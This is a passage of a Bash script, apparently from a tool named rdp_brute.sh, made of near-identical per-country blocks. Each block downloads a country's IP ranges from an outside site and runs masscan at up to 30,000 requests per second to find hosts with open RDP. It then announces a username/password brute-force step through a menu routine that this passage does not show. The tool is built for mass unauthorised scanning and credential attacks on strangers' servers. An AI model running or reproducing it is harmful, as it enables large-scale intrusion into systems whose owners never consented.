echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "129" ]; then
curl http://ipdiapazon.16mb.com/Netherlands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "130" ]; then
curl http://ipdiapazon.16mb.com/Netherlands_antilles.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "131" ]; then
curl http://ipdiapazon.16mb.com/New_caledonia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "132" ]; then
curl http://ipdiapazon.16mb.com/New_zealand.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "133" ]; then
curl http://ipdiapazon.16mb.com/Nicaragua.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "134" ]; then
curl http://ipdiapazon.16mb.com/Niger.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "135" ]; then
curl http://ipdiapazon.16mb.com/Nigeria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "136" ]; then
curl http://ipdiapazon.16mb.com/Niue.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "137" ]; then
curl http://ipdiapazon.16mb.com/Non-spec.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "138" ]; then
curl http://ipdiapazon.16mb.com/Norfolk.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "139" ]; then
curl http://ipdiapazon.16mb.com/Northern.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "140" ]; then
curl http://ipdiapazon.16mb.com/Norway.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "141" ]; then
curl http://ipdiapazon.16mb.com/Oman.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "142" ]; then
curl http://ipdiapazon.16mb.com/Pakistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "143" ]; then
curl http://ipdiapazon.16mb.com/Palau.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "144" ]; then
curl http://ipdiapazon.16mb.com/Palestinian.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "145" ]; then
curl http://ipdiapazon.16mb.com/Panama.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "146" ]; then
curl http://ipdiapazon.16mb.com/Papua_new_guinea.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "147" ]; then
curl http://ipdiapazon.16mb.com/Paraguay.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
